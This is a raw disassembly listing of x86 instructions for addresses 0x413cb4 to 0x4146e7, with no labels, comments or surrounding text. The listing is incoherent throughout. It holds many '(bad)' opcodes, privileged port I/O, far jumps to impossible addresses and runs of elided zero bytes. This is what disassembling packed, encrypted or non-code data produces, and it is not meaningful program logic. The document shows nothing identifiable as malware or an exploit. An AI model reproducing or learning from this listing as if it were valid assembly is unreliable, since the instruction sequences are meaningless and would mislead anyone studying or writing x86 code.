  413cb4:	rcr    dh,cl
  413cb6:	repnz add DWORD PTR es:[esi-0x7],edi
  413cbb:	leave  
  413cbc:	or     DWORD PTR [eax+ebx*1+0x1a],edi
  413cc0:	add    DWORD PTR [edx],esi
  413cc2:	adc    BYTE PTR [ebx],0xae
  413cc5:	xor    dh,bh
  413cc7:	jmp    0xfa4db8dd
  413ccc:	fidiv  WORD PTR [ecx]
  413cce:	(bad)  
  413ccf:	lods   al,BYTE PTR ds:[esi]
  413cd0:	or     dh,bh
  413cd2:	inc    esp
  413cd3:	aad    0x58
  413cd5:	inc    esp
  413cd6:	call   0x414fe4
  413cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cdc:	aam    0xc
  413cde:	add    ecx,ebp
  413ce0:	push   cs
  413ce1:	add    BYTE PTR [ebx-0x73fef72f],al
  413ce7:	fst    DWORD PTR [eax]
  413ce9:	add    BYTE PTR [eax],al
  413ceb:	add    bh,BYTE PTR [edi+0x296a0ea4]
  413cf1:	cs (bad) 
  413cf3:	scas   al,BYTE PTR es:[edi]
  413cf4:	push   cs
  413cf5:	push   0x12
  413cf7:	sub    dl,BYTE PTR [edx+0x18150836]
  413cfd:	jge    0x413cf8
  413cff:	leave  
  413d00:	add    BYTE PTR [ecx+eax*4],0x93
  413d04:	sub    DWORD PTR [ecx],esi
  413d06:	inc    BYTE PTR [eax]
	...
  413d24:	add    BYTE PTR [eax],al
  413d26:	mov    ah,0xfd
  413d28:	test   ch,cl
  413d2a:	es in  eax,dx
  413d2c:	std    
  413d2d:	(bad)  
  413d2e:	jmp    0xb886764a
  413d33:	outs   dx,BYTE PTR ds:[esi]
  413d34:	shr    ecx,cl
  413d36:	aam    0xfa
  413d38:	(bad)  
  413d39:	jmp    FWORD PTR [ebx]
  413d3b:	inc    edi
  413d3c:	adc    al,BYTE PTR [ecx]
  413d3e:	fs cld 
  413d40:	inc    DWORD PTR [edx-0x73f10524]
  413d46:	add    al,0xfb
  413d48:	(bad)  
  413d49:	dec    DWORD PTR [edi]
  413d4b:	dec    esi
  413d4c:	push   0xf
  413d4e:	out    0xa3,eax
  413d50:	icebp  
  413d51:	jmp    DWORD PTR [ebx]
  413d53:	std    
  413d54:	mov    ch,0x13
  413d56:	ja     0x413dd1
  413d58:	clc    
  413d59:	or     ah,BYTE PTR [eax+0x31fa8317]
  413d5f:	std    
  413d60:	lea    edx,[ebp-0x7e0212ea]
  413d66:	push   cs
  413d67:	xchg   esi,edi
  413d69:	push   DWORD PTR [edi*8-0x12e9767d]
  413d70:	std    
  413d71:	jmp    FWORD PTR [ecx+0x8]
  413d74:	cmp    DWORD PTR [ebp+0x8],eax
  413d77:	jb     0x413d48
  413d79:	jmp    0x4141fe
  413d7e:	stos   DWORD PTR es:[edi],eax
  413d7f:	cmp    BYTE PTR [edx],dl
  413d81:	add    esp,esp
  413d83:	add    eax,DWORD PTR [eax]
  413d85:	or     esp,0x4
  413d88:	jl     0x413d8e
	...
  413da6:	add    BYTE PTR [eax],al
  413da8:	jo     0x413dae
  413daa:	add    BYTE PTR [eax],al
  413dac:	fist   WORD PTR [ecx+0x6a]
  413daf:	packuswb mm6,QWORD PTR [edi-0xf]
  413db3:	push   DWORD PTR [ebx+0x2]
  413db6:	mov    dh,0x13
  413db8:	test   DWORD PTR [esi+0x260d0af8],0x7ebf557e
  413dc2:	xor    DWORD PTR [edx+0xbb034a7],eax
  413dc8:	mov    WORD PTR [ebx+0x199aff87],es
  413dce:	add    DWORD PTR [ebp-0x1ce54b8],eax
  413dd4:	mov    bl,BYTE PTR [esi+edx*1+0x39]
  413dd8:	enter  0xb034,0xd0
  413ddc:	fs jno 0x413de2
  413ddf:	add    BYTE PTR ds:0x9441560a,cl
  413de5:	mov    WORD PTR [esi],ss
  413de7:	cmp    ecx,DWORD PTR [edi+0x1e]
  413dea:	jle    0x413e35
  413dec:	or     al,0x19
  413dee:	add    ch,bl
  413df0:	push   cs
  413df1:	sub    dl,BYTE PTR [ecx+eax*2+0x6]
  413df5:	inc    edi
  413df6:	sahf   
  413df7:	push   cs
  413df8:	mov    gs,WORD PTR [ebx-0x1]
  413dfb:	dec    DWORD PTR ds:0x860a7826
  413e01:	ja     0x413df9
  413e03:	mov    DWORD PTR [ecx],ebx
  413e05:	dec    eax
  413e06:	lds    edi,FWORD PTR [edi+0x2c]
  413e09:	and    eax,0x8501
	...
  413e2a:	add    al,0x2b
  413e2c:	xor    dh,bh
  413e2e:	adc    ah,BYTE PTR [esi+edx*1+0x39]
  413e32:	push   eax
  413e33:	sub    eax,0xfff4d8b0
  413e38:	add    al,BYTE PTR [eax]
  413e3a:	or     eax,0x8441560a
  413e3f:	repz pop ss
  413e41:	cmp    ecx,edi
  413e43:	xor    eax,0x190c0d7e
  413e48:	add    ch,bl
  413e4a:	push   cs
  413e4b:	sub    dl,BYTE PTR [ecx+eax*2+0x16]
  413e4f:	call   FWORD PTR [edi-0x10071f2]
  413e55:	inc    dl
  413e57:	cs in  eax,dx
  413e59:	jns    0x413e62
  413e5b:	jnp    0x413e9b
  413e5d:	clc    
  413e5e:	test   bl,bh
  413e60:	test   esp,0xec212a
  413e66:	mov    DWORD PTR [edi+esi*2],edi
  413e69:	xor    DWORD PTR [ebx-0x2be7d4d2],ebx
  413e6f:	(bad)  
  413e70:	aam    0xb1
  413e72:	sbb    BYTE PTR gs:[ebx+0x4],al
  413e76:	or     eax,0xcc561a00
  413e7b:	js     0x413e38
  413e7d:	pop    ss
  413e7e:	ss inc edx
  413e80:	fnstsw WORD PTR [edi+0x3c]
  413e83:	(bad)  
  413e84:	call   0xfa43b48c
  413e89:	push   ebp
  413e8a:	int3   
  413e8b:	jmp    0x0:0x9f96
	...
  413eaa:	add    BYTE PTR [eax],al
  413eac:	add    eax,DWORD PTR [ebx+0xd0012]
  413eb2:	idiv   BYTE PTR [ecx+0x17]
  413eb5:	jnp    0x413e6d
  413eb7:	test   DWORD PTR [ebx+edi*8+0x20b2c4f7],0x909000e7
  413ec2:	div    DWORD PTR [eax]
  413ec4:	and    ebp,DWORD PTR [esi]
  413ec6:	mov    ds:0xdcc4d417,eax
  413ecb:	mov    cl,0x35
  413ecd:	sbb    BYTE PTR [edi+0x4],al
  413ed0:	or     eax,0x4c561a00
  413ed5:	ja     0x413f0a
  413ed7:	sbb    BYTE PTR [esi],dh
  413ed9:	inc    edx
  413eda:	in     eax,0x7f
  413edc:	cwde   
  413edd:	add    cl,ch
  413edf:	add    esi,esi
  413ee1:	add    edx,edi
  413ee3:	push   ebp
  413ee4:	dec    esp
  413ee5:	jmp    0x814cdf08
  413eea:	call   DWORD PTR [esi-0x2e]
  413eed:	sub    eax,0xfa44defe
  413ef2:	mov    bh,BYTE PTR [edi]
  413ef4:	lds    esi,FWORD PTR [edi+0xb]
  413ef7:	clc    
  413ef8:	shr    DWORD PTR [ebp-0x7bf21720],1
  413efe:	push   esp
  413eff:	cwde   
  413f00:	(bad)  ds:0xe7052cfe
  413f06:	inc    esp
  413f07:	aad    0x5c
  413f09:	dec    eax
  413f0a:	jmp    0x60:0x414f9801
	...
  413f2d:	add    BYTE PTR [ebx+0x11],ah
  413f30:	cmp    ebp,DWORD PTR [ebx]
  413f32:	mov    dl,0xa0
  413f34:	jmp    0x5f12:0x414f81ea
  413f3b:	cdq    
  413f3c:	push   cs
  413f3d:	push   0xffffff87
  413f3f:	stc    
  413f40:	(bad)  
  413f41:	call   0x724bb553
  413f46:	xor    al,0xf1
  413f48:	mov    ebp,esp
  413f4a:	inc    eax
  413f4c:	jg     0x413f96
  413f4e:	push   ds
  413f4f:	std    
  413f50:	test   cl,cl
  413f52:	jmp    FWORD PTR ds:0x11531efe
  413f58:	cmp    DWORD PTR [edx+ebx*1+0x2102d8ae],ebp
  413f5f:	repnz shr DWORD PTR [ebx-0x3dec2c59],1
  413f66:	shr    BYTE PTR [eax-0xef6fdd5],1
  413f6c:	shr    DWORD PTR [ebx-0x9943507],1
  413f72:	(bad)  
  413f73:	lock or ebp,ecx
  413f76:	push   cs
  413f77:	std    
  413f78:	mov    ch,0xe2
  413f7a:	ja     0x413f4f
  413f7c:	xor    esp,DWORD PTR [ebx+0xd]
  413f7f:	cmovae eax,DWORD PTR [eax]
  413f82:	je     0x413f67
  413f84:	push   cs
  413f85:	pshufw mm1,QWORD PTR [ecx],0xef
  413f89:	call   FWORD PTR [ebx-0x42ebbc24]
  413f8f:	aaa    
  413f90:	adc    bh,BYTE PTR [esi+0x0]
	...
  413faf:	add    ch,cl
  413fb1:	test   al,0x4b
  413fb3:	clc    
  413fb4:	scas   eax,DWORD PTR es:[edi]
  413fb5:	ret    
  413fb6:	or     eax,0xfdd70a84
  413fbb:	push   DWORD PTR [edi]
  413fbd:	outs   dx,DWORD PTR ds:[esi]
  413fbe:	jmp    0xa40d:0x90779b00
  413fc5:	add    BYTE PTR [ebx-0x3f7eefab],cl
  413fcb:	cli    
  413fcc:	in     eax,dx
  413fcd:	dec    esi
  413fce:	cli    
  413fcf:	sub    esi,0x2c
  413fd2:	or     eax,0xffff6d87
  413fd7:	(bad)  
  413fd8:	fist   DWORD PTR [edi]
  413fda:	xchg   ebx,eax
  413fdb:	arpl   WORD PTR [edi+0x43],si
  413fde:	dec    BYTE PTR [eax-0x3ec4eb4f]
  413fe4:	cdq    
  413fe5:	pop    eax
  413fe6:	mov    DWORD PTR [esi+0x48],eax
  413fe9:	sbb    esi,edx
  413feb:	jae    0x413f90
  413fed:	cmp    DWORD PTR [eax+ebx*1+0x34],0x246a1874
  413ff5:	fnsave [eax+ebx*1-0x51]
  413ff9:	jmp    0x413f86
  413ffb:	push   esi
  413ffc:	cmp    BYTE PTR [ecx+0x4992e8c1],ch
  414002:	(bad)  
  414003:	push   DWORD PTR [ecx-0x50a98c3d]
  414009:	ds imul bl
  41400c:	fldenv [esi-0x41e0e3ac]
  414012:	cmp    eax,ebx
	...
  414030:	add    BYTE PTR [eax],al
  414032:	arpl   WORD PTR [eax],cx
  414034:	mov    al,BYTE PTR [ebx]
  414036:	or     eax,0x602bc60f
  41403b:	dec    esp
  41403c:	cmp    ecx,0x89efed0c
  414042:	dec    esi
  414043:	sbb    al,ch
  414045:	inc    ebp
  414046:	and    ch,ch
  414048:	test   DWORD PTR [edx-0x36],0x503917e4
  41404f:	sub    eax,0x50a6b2ae
  414054:	fld    st(7)
  414056:	xchg   bl,bl
  414058:	lahf   
  414059:	mov    bh,BYTE PTR [ebp-0x28c5aec2]
  41405f:	sub    esp,DWORD PTR [ebp-0x3b514a76]
  414065:	jnp    0x413fef
  414067:	pop    ecx
  414068:	mov    dh,0x12
  41406a:	inc    esi
  41406b:	cld    
  41406c:	sti    
  41406d:	jne    0x414082
  41406f:	push   es
  414070:	cmp    eax,0xce5b8440
  414075:	cmp    cl,BYTE PTR [edx+eiz*1+0x7d]
  414079:	push   0x822dba5c
  41407e:	loopne 0x414068
  414080:	add    cl,BYTE PTR [edi]
  414082:	nop
  414083:	xlat   BYTE PTR ds:[ebx]
  414084:	es (bad) 
  414086:	push   edx
  414087:	cs iret 
  414089:	sti    
  41408a:	sbb    dl,BYTE PTR [edi-0x1dbd101f]
  414090:	jns    0x4140d6
  414092:	icebp  
  414093:	pop    eax
  414094:	jnp    0x4140da
	...
  4140b2:	add    BYTE PTR [eax],al
  4140b4:	jmp    0x9664f8ca
  4140b9:	repnz cwde 
  4140bb:	jmp    DWORD PTR [ebx]
  4140bd:	lods   al,BYTE PTR ds:[esi]
  4140be:	push   cs
  4140bf:	mov    eax,DWORD PTR [esi+0x2a]
  4140c2:	mov    dh,0x17
  4140c4:	mov    ebx,0xa0fb631
  4140c9:	mov    ah,0xfe
  4140cb:	(bad)  
  4140cc:	js     0x4140ce
  4140ce:	icebp  
  4140cf:	sbb    esp,DWORD PTR [ecx+0x24]
  4140d2:	(bad)  ds:0xfda88547
  4140d8:	xchg   ecx,eax
  4140d9:	rcr    esi,cl
  4140db:	add    ecx,DWORD PTR ds:0x5f3023e7
  4140e1:	push   esp
  4140e2:	iret   
  4140e3:	sbb    ebx,esp
  4140e5:	sub    dh,BYTE PTR [ebp+0x7716e401]
  4140eb:	jnp    0x414136
  4140ed:	adc    al,0xe2
  4140ef:	inc    edx
  4140f0:	cmp    DWORD PTR [esi+0x71],edx
  4140f3:	(bad)  
  4140f4:	es out 0xb0,eax
  4140f7:	mov    cl,0x95
  4140f9:	cli    
  4140fa:	push   esi
  4140fb:	adc    DWORD PTR [esi+0x6b6f325],ecx
  414101:	mov    edi,0x921f4bc1
  414106:	push   0xc4b514e9
  41410b:	sbb    BYTE PTR ds:0xfefa627f,ch
  414111:	or     ebp,DWORD PTR [edx-0x52]
  414114:	sar    bh,cl
  414116:	fild   DWORD PTR [edi+0x0]
	...
  414134:	add    BYTE PTR [eax],al
  414136:	(bad)  
  414137:	and    eax,0x7efdb7e1
  41413c:	inc    edx
  41413d:	add    cl,ah
  41413f:	sti    
  414140:	sub    cl,BYTE PTR [bx+di-0x1701]
  414145:	add    ebx,DWORD PTR [edx]
  414147:	test   DWORD PTR [esi-0x56d5bcd4],edi
  41414d:	sub    al,0xd1
  41414f:	adc    esp,eax
  414151:	mov    esi,0x1b56ac1e
  414156:	retf   0xd2a
  414159:	sub    eax,0xfc94c9e7
  41415e:	(bad)  
  41415f:	in     al,dx
  414160:	std    
  414161:	sub    al,0x13
  414163:	cli    
  414164:	(bad)  
  414165:	ds sbb al,0x7d
  414168:	stc    
  414169:	loopne 0x41416c
  41416b:	jle    0x4141b7
  41416d:	out    0x29,al
  41416f:	sub    al,BYTE PTR [edx-0x7c05111d]
  414175:	sub    edi,DWORD PTR [eax]
  414177:	sub    bh,dh
  414179:	push   0xe8ff8934
  41417e:	push   cs
  41417f:	stc    
  414180:	xor    edi,0x21
  414183:	sub    bh,dh
  414185:	sub    dl,cl
  414187:	out    0xc0,al
  414189:	sub    eax,0xa62a1859
  41418e:	jmp    0x6d807bbc
  414193:	cli    
  414194:	and    cl,0xf9
  414197:	sub    esi,edi
  414199:	fiadd  WORD PTR [eax]
	...
  4141b7:	add    BYTE PTR [eax],bl
  4141b9:	push   cs
  4141ba:	add    DWORD PTR [ebx+0x6a10ad97],0xffffffe4
  4141c1:	or     BYTE PTR [ebp+eiz*8-0x71],dh
  4141c5:	daa    
  4141c6:	lahf   
  4141c7:	jmp    0x6c5041da
  4141cc:	ja     0x4141f8
  4141ce:	(bad)  
  4141cf:	pop    esi
  4141d0:	dec    ebp
  4141d1:	jmp    0x51fb6a10
  4141d6:	call   0xfe6b722a
  4141db:	add    cl,BYTE PTR [ebx-0x6b]
  4141de:	push   cs
  4141df:	push   0xffffffc5
  4141e1:	sub    bh,dh
  4141e3:	ss dec ecx
  4141e5:	jae    0x4141f9
  4141e7:	push   0xfffffff4
  4141e9:	test   BYTE PTR [esi],0x6d
  4141ec:	pop    ss
  4141ed:	sub    edi,esi
  4141ef:	push   ds
  4141f0:	lea    esp,[edi]
  4141f2:	or     ah,dh
  4141f4:	xchg   edx,eax
  4141f5:	dec    ecx
  4141f6:	std    
  4141f7:	push   cs
  4141f8:	icebp  
  4141f9:	jge    0x4141f4
  4141fb:	add    BYTE PTR [eax],ah
  4141fd:	sub    al,0x82
  4141ff:	xlat   BYTE PTR ds:[ebx]
  414200:	adc    dl,ch
  414202:	std    
  414203:	cmp    esi,0x2a
  414206:	or     eax,0xfddb2284
  41420b:	jmp    DWORD PTR [ebp-0x26]
  41420e:	add    DWORD PTR [eax],0xffffffe4
  414211:	cld    
  414212:	push   cs
  414213:	test   BYTE PTR [esi+0x37fffdd5],dh
  414219:	inc    esp
  41421a:	cmp    ecx,eax
	...
  414238:	add    BYTE PTR [eax],al
  41423a:	push   eax
  41423b:	xchg   esi,eax
  41423c:	out    0xb7,eax
  41423e:	xchg   edx,eax
  41423f:	aam    0xfd
  414241:	cmp    esp,DWORD PTR [edx]
  414243:	mov    BYTE PTR ds:0xfdd65883,cl
  414249:	inc    ebx
  41424b:	scas   al,BYTE PTR es:[edi]
  41424c:	adc    DWORD PTR [ebx+0x1b72296e],eax
  414252:	aaa    
  414253:	fimul  DWORD PTR [ecx]
  414255:	je     0x4141f1
  414257:	cmp    eax,0x8313980c
  41425d:	cli    
  41425e:	mov    eax,ds:0xfe810a58
  414263:	jle    0x414263
  414265:	push   DWORD PTR [ebp+eiz*1-0x7d]
  414269:	mov    esi,edx
  41426b:	aam    0xfd
  41426d:	inc    ebx
  41426e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41426f:	sbb    DWORD PTR [edi+0x7f0b327c],edi
  414275:	(bad)  
  414276:	rcl    esp,cl
  414278:	xchg   DWORD PTR [ebp+0x38],eax
  41427b:	sbb    DWORD PTR [edi-0x3911ef1],edi
  414281:	inc    DWORD PTR [ebx]
  414283:	sbb    DWORD PTR [esp+ebp*2+0x63],ebx
  414287:	adc    DWORD PTR [eax-0x2],0xb60dd4f3
  41428e:	daa    
  41428f:	test   eax,0x90d3454
  414294:	add    BYTE PTR [eax],dl
  414296:	or     DWORD PTR [edx+0x7f],ecx
  414299:	pop    ebx
  41429a:	sbb    eax,DWORD PTR [ecx]
  41429c:	sub    eax,DWORD PTR [edx+0x0]
	...
  4142bb:	add    BYTE PTR [edx],dl
  4142bd:	arpl   WORD PTR [esi],cx
  4142bf:	cmp    DWORD PTR [eax+0x45],ebx
  4142c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142c3:	(bad)  
  4142c5:	xchg   DWORD PTR [eax],ebp
  4142c7:	(bad)  
  4142c8:	cli    
  4142c9:	mov    al,0xbf
  4142cb:	adc    esi,DWORD PTR [esi]
  4142cd:	pop    eax
  4142ce:	stc    
  4142cf:	mov    WORD PTR [esi+0x4f],cs
  4142d2:	sub    esi,edi
  4142d4:	xlat   BYTE PTR es:[ebx]
  4142d6:	xchg   edi,eax
  4142d7:	push   cs
  4142d8:	mov    ?,ecx
  4142da:	sub    esi,edi
  4142dc:	rcl    BYTE PTR [esi],cl
  4142de:	jo     0x4142e2
  4142e0:	xchg   esi,eax
  4142e1:	pop    es
  4142e2:	lock cmc 
  4142e4:	or     DWORD PTR [ecx-0x2],ecx
  4142e7:	push   cs
  4142e8:	xchg   ecx,eax
  4142e9:	push   ebx
  4142ea:	sub    dh,bh
  4142ec:	mov    dl,0xda
  4142ee:	sub    al,BYTE PTR [ecx+eax*1+0x50]
  4142f2:	mov    bh,0x13
  4142f4:	and    DWORD PTR [edi+0x1b],edx
  4142f7:	sbb    ebx,DWORD PTR [ebx+0x4888297e]
  4142fd:	dec    ebp
  4142fe:	in     eax,dx
  4142ff:	rcr    BYTE PTR [edx],0x9c
  414302:	adc    edi,esi
  414304:	adc    BYTE PTR [esi+0x2de95ded],0x85
  41430b:	in     eax,dx
  41430c:	jo     0x4142d4
  41430e:	sub    DWORD PTR [esi],ecx
  414310:	mov    ds:0x19557d1a,eax
  414315:	iret   
  414316:	dec    BYTE PTR [edi]
  414318:	or     al,0x2e
  41431a:	jg     0x414313
  41431c:	push   eax
  41431d:	out    0x29,al
  41431f:	inc    edx
	...
  41433c:	add    BYTE PTR [eax],al
  41433e:	dec    edx
  41433f:	push   esp
  414340:	push   cs
  414341:	cmp    eax,edx
  414343:	dec    esp
  414344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414345:	frstor [eax+eax*1]
  414348:	adc    ebp,DWORD PTR [eax]
  41434a:	xor    esp,DWORD PTR [edi]
  41434c:	outs   dx,DWORD PTR ds:[esi]
  41434d:	sar    dh,0xea
  414350:	daa    
  414351:	cli    
  414352:	xchg   ecx,eax
  414353:	inc    edi
  414354:	or     ebp,DWORD PTR [edx]
  414356:	sbb    ebp,ebx
  414358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414359:	xchg   edi,eax
  41435a:	add    eax,DWORD PTR [ebx+0x270b283c]
  414360:	in     eax,0x71
  414362:	(bad)  
  414364:	xchg   esi,eax
  414365:	out    dx,eax
  414366:	add    ah,bh
  414368:	clc    
  414369:	add    al,BYTE PTR [edx]
  41436b:	jl     0x414313
  41436d:	daa    
  41436e:	jmp    0x414396
  414370:	sub    DWORD PTR [ecx],ebp
  414372:	dec    ecx
  414373:	or     al,0x10
  414375:	mov    bh,0xfe
  414377:	mov    ds:0x249a1ba6,eax
  41437c:	mov    ebp,0xdcbc9529
  414381:	in     al,dx
  414382:	int    0xf6
  414384:	pop    ebx
  414385:	push   edi
  414386:	mov    ecx,0x50eda526
  41438b:	xchg   esp,eax
  41438c:	in     eax,dx
  41438d:	test   BYTE PTR [esp+0x6e132995],dl
  414394:	jmp    0x7f2d8415
  414399:	add    ch,bh
  41439b:	pmaxsw mm7,QWORD PTR [esi-0x62]
  41439f:	and    al,0x75
  4143a1:	sub    DWORD PTR [eax],eax
	...
  4143bf:	add    bh,cl
  4143c1:	and    edx,DWORD PTR es:[eax]
  4143c4:	xor    al,0xb5
  4143c6:	cld    
  4143c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143c8:	push   eax
  4143c9:	sbb    BYTE PTR [esi+0x27],ah
  4143cc:	imul   esp,DWORD PTR [esi],0x5f
  4143cf:	mov    edi,0xf927eafe
  4143d4:	mov    DWORD PTR [edx-0x15acd6bd],ebp
  4143da:	sahf   
  4143db:	xchg   edi,eax
  4143dc:	sbb    eax,DWORD PTR [ebx+0x25eb90ff]
  4143e2:	(bad)  
  4143e3:	fidivr WORD PTR [ecx+eax*1+0x2c22bf8b]
  4143ea:	add    edi,ecx
  4143ec:	(bad)  
  4143ed:	test   BYTE PTR [ebx-0x1da1475],0xaa
  4143f4:	in     eax,0xbb
  4143f6:	adc    eax,eax
  4143f8:	pop    ebx
  4143f9:	adc    bh,BYTE PTR [edi+ebx*1+0x26]
  4143fd:	sar    esp,1
  4143ff:	div    BYTE PTR ds:0xfaa6b5f6
  414405:	div    BYTE PTR [ebp-0x20bf0dca]
  41440b:	icebp  
  41440c:	jmp    0xc96d051
  414411:	add    ebx,ebp
  414413:	(bad)  
  414415:	imul   eax,DWORD PTR [esi-0x18],0xffffffd5
  414419:	imul   ecx,DWORD PTR [esi-0x15],0x4f
  41441d:	inc    ebp
  41441e:	pop    es
  41441f:	loop   0x414470
  414421:	add    bh,al
  414423:	imul   eax,DWORD PTR [eax],0x0
	...
  414441:	add    BYTE PTR [ebp+0x179573d1],ah
  414447:	xchg   edx,eax
  414448:	jecxz  0x4143e8
  41444a:	cmc    
  41444b:	cmc    
  41444c:	mov    ch,0x26
  41444e:	or     ch,dh
  414450:	mov    ch,0x36
  414452:	or     eax,0x91f1e03f
  414457:	aaa    
  414458:	mov    BYTE PTR [edi*1-0x3b4d36fe],ch
  41445f:	adc    DWORD PTR [edi],ecx
  414461:	pop    ebp
  414462:	jae    0x414466
  414464:	add    cl,ch
  414466:	mov    DWORD PTR ds:0x3e67dd60,ebp
  41446c:	inc    esp
  41446d:	or     DWORD PTR [ebx],ecx
  41446f:	add    BYTE PTR [eax],al
  414471:	jmp    0xc3fa6f
  414476:	inc    ecx
  414477:	and    esi,edi
  414479:	jmp    0x5174:0x2443a47d
  414480:	std    
  414481:	jne    0x414487
  414483:	daa    
  414484:	mov    ah,0x7
  414486:	jmp    0x4144dd
  414488:	sbb    cl,BYTE PTR [edi]
  41448a:	ret    0x2690
  41448d:	jae    0x414503
  41448f:	add    edi,edi
  414491:	jne    0x4144af
  414493:	cld    
  414494:	(bad)  
  414495:	push   esi
  414496:	or     edx,DWORD PTR [esi+0xe]
  414499:	mov    edi,DWORD PTR [edi]
  41449b:	fdiv   DWORD PTR [ebx+0xc]
  41449e:	sti    
  41449f:	push   edx
  4144a0:	push   es
  4144a1:	call   0x3f2645
	...
  4144c2:	add    BYTE PTR [eax],al
  4144c4:	popa   
  4144c5:	mov    esp,0xfe090b72
  4144ca:	sti    
  4144cb:	(bad)  
  4144cc:	mov    ebx,0xef54832c
  4144d1:	add    BYTE PTR [eax],al
  4144d3:	rsqrtps xmm4,XMMWORD PTR [ebp-0x1]
  4144d7:	push   cs
  4144d8:	inc    edx
  4144d9:	ins    DWORD PTR es:[edi],dx
  4144da:	add    cl,al
  4144dc:	aam    0x23
  4144de:	or     ecx,eax
  4144e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144e1:	fmul   DWORD PTR ds:0xefae3b6
  4144e7:	mov    dh,0xfb
  4144e9:	add    ecx,eax
  4144eb:	loopne 0x414499
  4144ed:	sub    DWORD PTR [edi+0x5218c880],edi
  4144f3:	je     0x414535
  4144f5:	cmp    DWORD PTR [ebx+0x20],0xa2832d74
  4144fc:	ja     0x4144fe
  4144fe:	add    BYTE PTR [edi],cl
  414500:	inc    edx
  414501:	and    eax,0x43e4b60d
  414506:	jno    0x414548
  414508:	je     0x41450b
  41450a:	clc    
  41450b:	jmp    0x41451a
  41450d:	gs jns 0x414564
  414510:	add    DWORD PTR [ecx+0x0],eax
  414513:	(bad)  
  414514:	fcomp  DWORD PTR [edx]
  414516:	and    eax,0x258d2574
  41451b:	je     0x41453a
  41451d:	out    dx,al
  41451e:	mov    al,0xb
  414520:	cmp    ch,BYTE PTR [ebx-0x6]
  414523:	out    0x35,eax
  414525:	mul    BYTE PTR [esi]
  414527:	inc    BYTE PTR [eax]
	...
  414545:	add    BYTE PTR [eax+0x2584f6d6],dl
  41454b:	and    BYTE PTR [edx],al
  41454d:	add    BYTE PTR [esi-0x19151d8d],al
  414553:	mov    cl,0xb8
  414555:	and    edx,DWORD PTR [esi+0x5c410e8c]
  41455b:	mov    DWORD PTR ds:0x3a9e1974,esp
  414561:	(bad)  
  414562:	js     0x4145b5
  414564:	int3   
  414565:	(bad)  
  414566:	pusha  
  414567:	sub    DWORD PTR ds:0xaf4a1174,esp
  41456d:	pop    es
  41456e:	in     eax,0x5e
  414570:	and    bh,dh
  414572:	rcl    BYTE PTR [edx+eax*2-0x7916ff2],cl
  414579:	inc    edx
  41457b:	xchg   esi,eax
  41457c:	cmp    eax,0xe3bc8e02
  414581:	inc    DWORD PTR [edi+0x1145e913]
  414587:	cmp    ah,0xe
  41458a:	(bad)  
  41458b:	push   edx
  41458c:	and    bh,dh
  41458e:	call   0x22f:0x62e82bff
  414595:	add    bh,dh
  414597:	lea    ebx,[ebx]
  414599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41459a:	pop    ss
  41459b:	sbb    DWORD PTR [edx],eax
  41459d:	mov    ecx,eax
  41459f:	cmp    al,0xf5
  4145a1:	mov    ch,0xda
  4145a3:	jmp    edi
  4145a5:	les    edi,FWORD PTR [ebp+0xe3d322]
	...
  4145c7:	add    BYTE PTR [ecx-0x1ed91545],dl
  4145cd:	add    esp,DWORD PTR [eax-0x40]
  4145d0:	push   es
  4145d1:	and    edi,DWORD PTR [ebx-0x69c869f5]
  4145d7:	es mov ecx,0x80f6990f
  4145dd:	sti    
  4145de:	(bad)  [ebp-0x4e]
  4145e1:	xlat   BYTE PTR ds:[ebx]
  4145e2:	cdq    
  4145e3:	ret    
  4145e4:	sub    ah,BYTE PTR [edx]
  4145e6:	xchg   ebx,eax
  4145e7:	sti    
  4145e8:	(bad)  
  4145ea:	jmp    0x8d57842
  4145ef:	adc    esi,DWORD PTR es:[edi+0x0]
  4145f3:	test   BYTE PTR [ebx],cl
  4145f5:	add    eax,0xad0325fd
  4145fa:	shl    DWORD PTR [esi],cl
  4145fc:	xor    BYTE PTR [eax+0x2306afed],0xfb
  414603:	lahf   
  414604:	add    al,al
  414606:	call   0xa8be8bd5
  41460b:	scas   eax,DWORD PTR es:[edi]
  41460c:	pop    es
  41460d:	jns    0x41463d
  41460f:	mov    ah,0x81
  414611:	mov    edx,0xf6591bc5
  414616:	call   0x54a2d41e
  41461b:	add    al,0xd
  41461d:	add    cl,ch
  41461f:	scas   al,BYTE PTR es:[edi]
  414620:	add    eax,0x95f82b77
  414625:	jns    0x4146a3
  414627:	add    al,0xd
  414629:	add    BYTE PTR [edx+0x3d],ah
	...
  414648:	add    BYTE PTR [eax],al
  41464a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41464b:	jmp    0x41462f
  41464d:	add    ecx,DWORD PTR ds:0x4ae02b77
  414653:	sar    BYTE PTR [ebp-0x51],1
  414656:	and    dh,bl
  414658:	(bad)  
  414659:	ds js  0x41467d
  41465c:	je     0x41462b
  41465e:	jns    0x4146cc
  414660:	(bad)  
  414661:	adc    DWORD PTR [edx+eiz*8+0xab25dff],ebx
  414668:	add    edi,DWORD PTR [esi]
  41466a:	dec    ebx
  41466b:	and    DWORD PTR [ecx+edi*8-0x2b],esi
  41466f:	xor    eax,0x2142bcfe
  414674:	je     0x414667
  414676:	es add al,ah
  414679:	ss lock jnp 0x41463c
  41467d:	fidiv  WORD PTR [ebx+0xee909ff]
  414683:	push   0x21e81d19
  414688:	call   0xfe633b00
  41468d:	bound  edx,QWORD PTR [edx-0x22]
  414690:	aas    
  414691:	cdq    
  414692:	xor    DWORD PTR [edi+ebx*1-0x1058f12],ebp
  414699:	jl     0x4146ad
  41469b:	icebp  
  41469c:	mov    ch,0x59
  41469e:	shr    DWORD PTR [esi-0x53ce16c1],1
  4146a4:	pop    ss
  4146a5:	jmp    0x7501:0x5cfecb51
  4146ac:	retf   0xce
	...
  4146cb:	add    BYTE PTR [ebx-0x36c3010b],ah
  4146d1:	sbb    ebx,eax
  4146d3:	sahf   
  4146d4:	jmp    0xc1eacafa
  4146d9:	jl     0x41469e
  4146db:	loopne 0x4146eb
  4146dd:	add    BYTE PTR [eax-0x1de0afe],bh
  4146e3:	nop
  4146e4:	retf   
  4146e5:	push   ss
  4146e6:	(bad)  
  4146e7:	xchg   esi,eax
